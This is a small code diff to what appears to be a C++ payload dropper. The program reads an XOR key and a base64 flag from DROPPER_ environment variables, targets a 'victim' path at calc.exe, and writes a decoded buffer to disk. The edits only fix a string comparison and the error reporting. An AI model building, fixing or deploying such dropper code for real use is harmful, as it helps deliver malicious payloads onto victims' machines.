@@ -51,7 +51,8 @@ char* victim_name = (char*) "C:\\Windows\\System32\\calc.exe";
 
 int xor_key = atoi(getenv("DROPPER_XOR_KEY"));
 
-bool base64 = getenv("DROPPER_BASE64") == "true";
+char* env = getenv("DROPPER_BASE64");
+bool base64 = (env && strcmp(env, "true") == 0);
 
 // Entry Point
 int main(int argc, char* argv[])
@@ -197,7 +198,8 @@ void drop(int size, void* buffer)
 	FILE* f = fopen(name, "ab");
 	// traverse byte list
 	if (!f) {
-		std::cerr << "Dropping failed due to file error." << std::endl;
+		std::cout << "Dropping failed due to file error." << std::endl;
+		perror("fopen");
 	}
 	else {
 		for (int i = 0;i < size;i++)
